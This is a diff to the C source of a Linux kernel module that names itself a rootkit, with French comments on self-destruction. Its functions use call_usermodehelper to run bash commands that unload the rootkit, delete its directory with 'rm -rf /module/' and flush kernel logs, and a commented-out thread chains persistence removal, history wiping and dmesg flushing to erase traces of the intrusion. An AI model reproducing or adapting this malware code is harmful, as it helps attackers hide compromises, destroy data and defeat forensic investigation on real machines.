@@ -1,7 +1,3 @@
-//Comment auto-détruire : 
-//- unhide .ko (module_show() h_kill.h)
-//- rmmod rootkit.ko 
-
 #include <linux/kernel.h>
 #include <linux/init.h>
 #include <linux/module.h>
@@ -13,21 +9,10 @@
 #include <linux/kallsyms.h>
 #include <linux/fs_struct.h>
 #include <linux/slab.h>
-#include <linux/kthread.h>
-//#include "hooked_funcs/h_kill.h"
-//module_show()
 
-void unload(void){
-    char *cmd_argv[] = { "/bin/bash", "-c", "/sbin/rmmod rootkit", NULL };
-    char *cmd_envp[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
-    call_usermodehelper(cmd_argv[0], cmd_argv, cmd_envp, UMH_WAIT_EXEC);
-
-}
-
-// - Supprimer /module
 
 void kboom(void){
-    char *cmd_argv[] = { "/bin/bash", "-c", "/bin/rm -rf /module/", NULL };
+    char *cmd_argv[] = { "/bin/bash", "-c", "/sbin/rmmod rootkit && /bin/rm -rf /module/", NULL };
     char *cmd_envp[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
     call_usermodehelper(cmd_argv[0], cmd_argv, cmd_envp, UMH_WAIT_EXEC);
 
@@ -57,3 +42,16 @@ void flush_dmesg(void){
     char *cmd_envp[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
     call_usermodehelper(cmd_argv[0], cmd_argv, cmd_envp, UMH_WAIT_EXEC);
 }
+
+// int one_thread_to_destruct_all(void *func){
+//     kboom_persistence();
+//     kboom();
+//     flush_history();
+//     flush_dmesg();
+
+//     return 0;
+// }
+
+
+
+//EXPORT_SYMBOL(my_work);
